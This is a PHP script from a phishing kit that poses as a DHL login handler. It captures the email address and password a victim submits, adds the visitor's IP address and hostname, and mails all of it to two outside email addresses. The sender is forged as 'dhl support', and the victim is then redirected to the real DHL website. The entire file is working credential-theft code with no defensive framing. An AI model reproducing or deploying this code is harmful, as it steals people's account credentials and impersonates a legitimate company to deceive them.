<?php

if(!$_POST) exit;

$email = $_POST['email'];
$epass = $_POST['epass'];

if(!eregi("^[a-z0-9]+([_\\.-][a-z0-9]+)*" ."@"."([a-z0-9]+([\.-][a-z0-9]+)*)+"."\\.[a-z]{2,}"."$",$email )){
	$error.="Invalid email address entered";
	$errors=1;
}
if($errors==1) echo "<script language=\"Javascript\" type=\"text/javascript\">
				window.location=\"default.html?status=error\";
				</script>";
else{
	$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message  = "------------------+ DHL ReZulT +-----------------\n";
$message .= "Email : $email\n";
$message .= "Password : $epass\n";
$message .= "IP Address : $ip\n";
$message .= "HostName  : $hostname\n";
$message .= "-------------------+ Created in 2017 By SeeGates +--------------------\n";

$send="seegates007@yahoo.fr, dobensy@gmail.com";

$subject = "DHL ReZulT | $email | $ip";
$headers = "From: dhl support <support@logistics.dhl>";
mail($send,$subject,$message,$headers);
header('Location: http://www.dhl.com');
}
?>